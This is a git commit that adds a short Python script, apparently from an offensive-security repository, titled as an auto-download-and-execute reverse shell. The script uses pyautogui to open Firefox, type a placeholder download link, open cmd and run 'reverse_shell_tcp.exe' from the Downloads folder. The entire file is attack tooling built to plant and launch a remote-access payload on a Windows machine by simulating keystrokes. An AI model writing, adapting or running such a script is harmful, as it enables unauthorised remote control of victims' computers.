cda5d12f3117055abdd4683725e67b3b86b71f0c
evilhacker53 <37243893+evilhacker53@users.noreply.github.com>
2019-06-27 17:42:04 +0530

    Add files via upload

---
+++ Auto download reverse shell from browser and execute it/1.py
@@ -0,0 +1,19 @@
+import pyautogui
+import time
+
+pyautogui.hotkey('win' , 'r')
+pyautogui.typewrite('firefox')
+pyautogui.hotkey('enter')
+pyautogui.click(x=309, y=55, clicks=1, button='left')
+pyautogui.typewrite('reverse shell tcp link')
+time.sleep(1)
+pyautogui.hotkey('win' , 'r')
+pyautogui.typewrite('cmd')
+pyautogui.hotkey('enter')
+time.sleep(1)
+pyautogui.typewrite('cd downloads')
+pyautogui.hotkey('enter')
+time.sleep(1)
+pyautogui.typewrite('reverse_shell_tcp.exe')
+pyautogui.hotkey('enter')
+pyautogui.hotkey('enter')
